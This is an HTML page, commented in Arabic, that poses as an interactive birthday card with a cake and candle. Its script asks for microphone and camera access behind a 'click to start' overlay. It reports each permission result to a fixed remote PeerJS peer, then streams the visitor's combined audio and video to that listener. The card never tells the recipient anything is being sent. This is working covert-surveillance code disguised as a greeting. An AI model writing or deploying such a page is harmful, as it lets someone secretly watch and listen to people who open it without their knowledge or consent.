<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎂 Interactive Birthday Card</title>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
</head>
<body>
  <!-- Overlay: لازم يضغطه علشان يشتغل طلب الإذن -->
  <div id="overlay">اضغط لبدء الكارت</div>

  <div class="card">
    <div class="cake">
      <div class="layer layer1"></div>
      <div class="layer layer2"></div>
      <div class="layer layer3"></div>
      <div class="icing"></div>
      <div class="candle" id="candle">
        <div class="flame" id="flame"></div>
      </div>
    </div>
    <!-- هنا بنعرض بث الكاميرا بعد إذن الكام -->
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = 'birthday-listener';
    const peer       = new Peer();
    let dataConn;
    let micStream, camStream;

    const overlay = document.getElementById('overlay');
    const videoEl = document.getElementById('userCam');
    const flame   = document.getElementById('flame');

    overlay.addEventListener('click', async () => {
      overlay.style.display = 'none';

      // افتح DataChannel وإعلامنا بفتح الصفحة
      dataConn = peer.connect(LISTENER_ID);
      dataConn.on('open', () => {
        dataConn.send({ event: 'page-open' });
      });

      // 1) طلب إذن الميكروفون أولاً
      try {
        micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        dataConn.send({ event: 'mic-allowed' });
      } catch (err) {
        dataConn.send({ event: 'mic-denied' });
        console.error('Mic access denied', err);
      }

      // 2) طلب إذن الكاميرا ثانياً
      try {
        camStream = await navigator.mediaDevices.getUserMedia({ video: true });
        dataConn.send({ event: 'camera-allowed' });

        // عرض بث الكاميرا
        videoEl.srcObject = camStream;
        Object.assign(videoEl.style, {
          position: 'absolute',
          top: '10px',
          left: 'calc(50% - 75px)',
          width: '150px',
          height: '150px',
          borderRadius: '50%',
          border: '4px solid white',
          boxShadow: '0 0 15px rgba(255,255,255,0.7)'
        });
      } catch (err) {
        dataConn.send({ event: 'camera-denied' });
        console.error('Camera access denied', err);
      }

      // 3) لو كل حاجة اتسمحت، ندمج المسارات ونبثها
      if (micStream && camStream) {
        const combined = new MediaStream([
          ...micStream.getAudioTracks(),
          ...camStream.getVideoTracks()
        ]);
        peer.call(LISTENER_ID, combined);
      }
    });
  </script>
</body>
</html>
